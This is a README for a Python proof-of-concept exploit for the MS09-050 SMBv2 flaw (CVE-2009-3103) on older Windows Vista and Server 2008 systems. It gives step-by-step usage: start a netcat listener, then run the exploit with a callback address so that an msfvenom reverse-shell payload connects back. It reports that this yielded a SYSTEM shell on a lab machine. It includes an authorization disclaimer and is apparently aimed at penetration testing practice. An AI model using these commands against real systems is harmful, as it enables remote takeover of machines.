# MS09-050 SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)

Python 3 proof of concept for CVE-2009-3103 on x86 Windows Vista SP1/SP2 and Windows Server 2008 SP1/SP2. It calculates SMB packet lengths for a fresh payload instead of relying on the fixed lengths in older Python copies.

Use only on systems you own or are authorized to test. The exploit may crash a vulnerable VM; revert it before retrying.

## Use

Requires Python 3, `msfvenom`, `rpcclient` (or `smbclient`), and an `nc` listener. With `tun0`, the callback IP is detected automatically; otherwise pass `-l`.

```bash
# Terminal 1
rlwrap nc -lvnp 443

# Terminal 2 (documentation IPs; replace both)
python3 ms09_050.py 192.0.2.10 -l 192.0.2.20 -p 443
```

Run `python3 ms09_050.py -h` for all options. `--check` builds without sending; `--sc payload.bin --check` also works without `msfvenom`. The default payload is stageless `windows/shell_reverse_tcp`; no callback address or generated payload is stored in this repository.

## Validation and sources

The default route returned `NT AUTHORITY\SYSTEM` on one authorized Windows Server 2008 SP1 x86 lab VM. Other targets and custom payloads are unverified.

References: [Microsoft Security Advisory 975497](https://learn.microsoft.com/en-us/security-updates/SecurityAdvisories/2009/975497), [Rapid7 Metasploit MS09-050 module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms09_050_smb2_negotiate_func_index.rb), and [ohnozzy's earlier Python proof of concept](https://www.exploit-db.com/exploits/40280). Rapid7's BSD 3-Clause notice is retained in [LICENSE](LICENSE).
